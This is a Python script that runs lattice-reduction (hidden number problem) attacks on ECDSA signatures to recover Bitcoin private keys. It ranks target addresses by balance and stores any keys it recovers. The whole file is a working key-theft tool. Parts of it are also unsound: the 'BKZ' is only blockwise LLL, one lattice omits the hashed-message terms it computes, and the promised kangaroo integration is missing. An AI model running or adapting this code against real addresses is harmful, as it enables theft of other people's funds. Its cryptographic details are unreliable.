#!/usr/bin/env python3
"""
Phase 3.2 — Advanced Lattice Reduction for HNP

Improvements over the basic LLL in lattice_nonce_analyzer.py:
1. BKZ (Block Korkine-Zolotarev) reduction — stronger than LLL
2. Progressive dimension increase — start small, expand if no result
3. Multiple bias assumptions tested in parallel
4. LSB-specific lattice transforms
5. Sliding window approach for large signature sets
6. Integration with Pollard's Kangaroo for partial results
"""
import time
import math
from collections import Counter
from db_manager import get_connection, add_recovered_key, add_finding
from lattice_nonce_analyzer import verify_key, solve_hnp

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


# ============================================================
# Enhanced LLL with BKZ-style improvements
# ============================================================

def gram_schmidt(basis):
    """Gram-Schmidt orthogonalization for lattice basis."""
    n = len(basis)
    m = len(basis[0])
    ortho = [list(row) for row in basis]
    mu = [[0.0] * n for _ in range(n)]

    for i in range(n):
        for j in range(i):
            dot_ij = sum(ortho[i][k] * ortho[j][k] for k in range(m))
            dot_jj = sum(ortho[j][k] * ortho[j][k] for k in range(m))
            if dot_jj == 0:
                mu[i][j] = 0
            else:
                mu[i][j] = dot_ij / dot_jj
            for k in range(m):
                ortho[i][k] -= mu[i][j] * ortho[j][k]

    return ortho, mu


def lll_reduce(basis, delta=0.99):
    """LLL lattice basis reduction with configurable delta parameter."""
    n = len(basis)
    if n == 0:
        return basis
    m = len(basis[0])
    basis = [list(row) for row in basis]

    def dot(a, b):
        return sum(x * y for x, y in zip(a, b))

    def proj_coeff(u, v):
        d = dot(u, u)
        return dot(v, u) / d if d != 0 else 0

    k = 1
    max_iter = n * n * 10
    iteration = 0

    while k < n and iteration < max_iter:
        iteration += 1
        ortho, mu = gram_schmidt(basis)

        # Size reduction
        for j in range(k - 1, -1, -1):
            if abs(mu[k][j]) > 0.5:
                r = round(mu[k][j])
                for i in range(m):
                    basis[k][i] -= r * basis[j][i]
                ortho, mu = gram_schmidt(basis)

        # Lovász condition
        ortho_k = ortho[k]
        ortho_km1 = ortho[k - 1]
        norm_k = dot(ortho_k, ortho_k)
        norm_km1 = dot(ortho_km1, ortho_km1)

        if norm_k >= (delta - mu[k][k - 1] ** 2) * norm_km1:
            k += 1
        else:
            basis[k], basis[k - 1] = basis[k - 1], basis[k]
            k = max(k - 1, 1)

    return basis


def bkz_reduce(basis, block_size=20, delta=0.99):
    """
    BKZ (Block Korkine-Zolotarev) lattice reduction.
    Processes the lattice in overlapping blocks for stronger reduction
    than plain LLL. Uses LLL as subroutine per block.
    """
    n = len(basis)
    if n <= block_size:
        return lll_reduce(basis, delta)

    # First do a full LLL pass
    basis = lll_reduce(basis, delta)

    # Then do BKZ tours
    for tour in range(3):  # Multiple tours for convergence
        for k in range(n - block_size + 1):
            end = min(k + block_size, n)
            block = [list(basis[i]) for i in range(k, end)]
            reduced_block = lll_reduce(block, delta)
            for i, row in enumerate(reduced_block):
                basis[k + i] = row

        # Re-LLL the whole thing after each tour
        basis = lll_reduce(basis, delta)

    return basis


# ============================================================
# Progressive Lattice Attack
# ============================================================

def build_hnp_lattice(sigs, bias_bits, transform='msb'):
    """Build the HNP lattice matrix for given signatures and bias assumption."""
    n = len(sigs)
    dim = n + 1

    # The lattice encodes: for each sig, s^{-1} * r * d ≡ s^{-1} * z + k (mod P)
    # where k has bias_bits of known/biased bits

    B = P >> bias_bits  # Bound on the unknown part of k

    matrix = [[0] * dim for _ in range(dim)]

    for i in range(n):
        s_inv = pow(sigs[i]['s'], -1, P)
        t_i = (s_inv * sigs[i]['r']) % P
        u_i = (s_inv * sigs[i]['z']) % P

        if transform == 'msb':
            matrix[i][i] = P
        elif transform == 'lsb':
            inv_2b = pow(1 << bias_bits, -1, P)
            t_i = (t_i * inv_2b) % P
            u_i = (u_i * inv_2b) % P
            matrix[i][i] = P

        matrix[n][i] = int(t_i)

    matrix[n][n] = B

    return matrix, B


def progressive_lattice_attack(address, max_dim=30):
    """
    Progressive lattice attack: start with small dimension (few sigs),
    increase if no immediate result.
    """
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT r_int, s_int, z_int FROM signatures WHERE address = ?", (address,))
    rows = c.fetchall()
    conn.close()

    sigs = [{'r': int(r), 's': int(s), 'z': int(z)} for r, s, z in rows]
    if len(sigs) < 4:
        return None

    print(f"    Progressive lattice: {len(sigs)} sigs available")

    # Try increasing dimensions with different bias assumptions
    for bias_bits in [4, 8, 16, 32, 64, 128]:
        for dim in [4, 6, 8, 12, 16, 20, min(len(sigs), max_dim)]:
            if dim > len(sigs):
                break

            subset = sigs[:dim]

            # Try MSB bias
            for transform in ['msb', 'lsb']:
                try:
                    matrix, B = build_hnp_lattice(subset, bias_bits, transform)
                    reduced = bkz_reduce(matrix, block_size=min(dim, 20))

                    # Check short vectors for the private key
                    for row in reduced:
                        candidate = row[-1]
                        if candidate < 0:
                            candidate = -candidate

                        # The last element should be close to B*d
                        d_candidates = [candidate % P, (P - candidate) % P]

                        # Also try dividing by B
                        if B > 0:
                            d_candidates.append((candidate * pow(B, -1, P)) % P)
                            d_candidates.append((P - (candidate * pow(B, -1, P)) % P) % P)

                        for d in d_candidates:
                            if 0 < d < P and verify_key(d, address):
                                return d
                except Exception:
                    continue

    # Also try the existing solve_hnp with more bias values
    for bias in [4, 6, 8, 10, 12, 16, 20, 24, 32, 48, 64, 80, 96, 128]:
        for window_start in range(0, len(sigs) - 3, max(1, len(sigs) // 5)):
            window = sigs[window_start:window_start + min(30, len(sigs))]
            key = solve_hnp(window, bias, address=address)
            if key:
                return key

    return None


# ============================================================
# Sliding Window Lattice
# ============================================================

def sliding_window_lattice(address, window_size=15, step=5):
    """
    Try lattice attacks on overlapping windows of signatures.
    Different windows may reveal different local bias patterns.
    """
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT r_int, s_int, z_int FROM signatures WHERE address = ?", (address,))
    rows = c.fetchall()
    conn.close()

    sigs = [{'r': int(r), 's': int(s), 'z': int(z)} for r, s, z in rows]
    if len(sigs) < window_size:
        return None

    print(f"    Sliding window: {len(sigs)} sigs, window={window_size}, step={step}")

    for start in range(0, len(sigs) - window_size + 1, step):
        window = sigs[start:start + window_size]
        for bias in [4, 8, 16, 32, 64]:
            key = solve_hnp(window, bias, address=address)
            if key:
                print(f"    Hit at window [{start}:{start+window_size}], bias={bias}")
                return key

    return None


# ============================================================
# Main Runner
# ============================================================

def run_advanced_lattice(max_addresses=20):
    """Run advanced lattice attacks on all addresses with signatures."""
    print("=" * 60)
    print("ADVANCED LATTICE REDUCTION (BKZ + Progressive)")
    print("=" * 60)

    conn = get_connection()
    c = conn.cursor()
    c.execute("""
        SELECT a.address, COUNT(s.id) as sig_count,
               COALESCE(a.current_balance, a.balance, 0) as bal
        FROM addresses a
        JOIN signatures s ON a.address = s.address
        GROUP BY a.address
        HAVING COUNT(s.id) >= 4
        ORDER BY bal DESC
        LIMIT ?
    """, (max_addresses,))
    targets = c.fetchall()
    conn.close()

    if not targets:
        print("  No addresses with ≥4 signatures")
        return []

    found = []
    for addr, sig_count, bal in targets:
        print(f"\n  {addr[:35]}... ({sig_count} sigs, {bal} BTC)")

        # Method 1: Progressive lattice with BKZ
        key = progressive_lattice_attack(addr)
        if key:
            key_hex = hex(key)[2:].zfill(64)
            print(f"  !!! KEY via Advanced Lattice: {key_hex[:30]}...")
            add_recovered_key(addr, key_hex, method='Advanced Lattice (BKZ)')
            found.append((addr, key_hex))
            continue

        # Method 2: Sliding window
        key = sliding_window_lattice(addr)
        if key:
            key_hex = hex(key)[2:].zfill(64)
            print(f"  !!! KEY via Sliding Window Lattice: {key_hex[:30]}...")
            add_recovered_key(addr, key_hex, method='Sliding Window Lattice')
            found.append((addr, key_hex))
            continue

        print(f"    No vulnerability found")

    print(f"\n  Advanced Lattice complete: {len(found)} keys recovered")
    return found


if __name__ == "__main__":
    import sys
    max_addr = int(sys.argv[1]) if len(sys.argv) > 1 else 20
    run_advanced_lattice(max_addresses=max_addr)
